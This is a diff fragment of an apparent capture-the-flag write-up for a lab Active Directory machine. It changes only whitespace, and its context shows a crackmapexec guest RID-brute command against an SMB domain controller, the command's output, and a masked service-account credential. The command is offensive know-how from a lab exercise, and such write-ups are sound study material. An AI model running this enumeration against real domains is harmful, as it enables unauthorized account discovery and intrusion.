@@ -135,7 +135,7 @@ The **SID** (Security IDentifier) is a unique ID number that a computer or domai
  ## Crackmapexec
 
  ```sh
- ┌──(alienum㉿kali)-[~/kerbrute-ropnop]
+┌──(alienum㉿kali)-[~/kerbrute-ropnop]
 └─$ crackmapexec smb ustoun.local -u guest -p '' --rid-brute
 SMB         10.10.138.186   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:ustoun.local) (signing:True) (SMBv1:False)
 SMB         10.10.138.186   445    DC               [+] ustoun.local\guest:
@@ -190,7 +190,6 @@ SMB         10.10.138.186   445    DC               [+] ustoun.local\SVC-Kerb:s*
 ```
 
 - Credentials `SVC-Kerb` : `s******n`
-
 ## impacket | mssqlclient
 
 ```#!/bin/sh
